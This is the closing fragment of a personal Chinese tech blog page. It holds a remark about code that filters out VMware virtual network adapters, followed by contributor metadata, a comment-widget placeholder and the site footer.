class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>（参考了部分大神的代码，已经过滤掉了VMware的虚拟机网卡）</p></div><!----><footer class="page-meta"><!----><div class="meta-item git-info"><div class="update-time"><span class="label">上次编辑于: </span><!----></div><div class="contributors"><span class="label">贡献者: </span><!--[--><!--[--><span class="contributor" title="email: 872285171@qq.com">Weekend</span><!--]--><!--]--></div></div></footer><!----><div class="giscus-wrapper input-top" id="comment" style="display:block;"><div class="loading-icon-wrapper" style="display:flex;align-items:center;justify-content:center;height:96px"><svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" preserveAspectRatio="xMidYMid" viewBox="25 25 50 50"><animateTransform attributeName="transform" type="rotate" dur="2s" keyTimes="0;1" repeatCount="indefinite" values="0;360"></animateTransform><circle cx="50" cy="50" r="20" fill="none" stroke="currentColor" stroke-width="4" stroke-linecap="round"><animate attributeName="stroke-dasharray" dur="1.5s" keyTimes="0;0.5;1" repeatCount="indefinite" values="1,200;90,200;1,200"></animate><animate attributeName="stroke-dashoffset" dur="1.5s" keyTimes="0;0.5;1" repeatCount="indefinite" values="0;-35px;-125px"></animate></circle></svg></div></div><!----><!--]--></main><!--]--><footer class="vp-footer-wrapper"><div class="vp-footer">做一个无聊的人，做一些有趣的事，劈柴🎄、喂马🐎、周游世界🌍</div><div class="vp-copyright">Copyright © 2023 Weekend</div></footer></div><!--]--><!----><!----><!--]--></div>
    <script type="module" src="/assets/app-d50b0428.js" defer></script>
  </body>
</html>
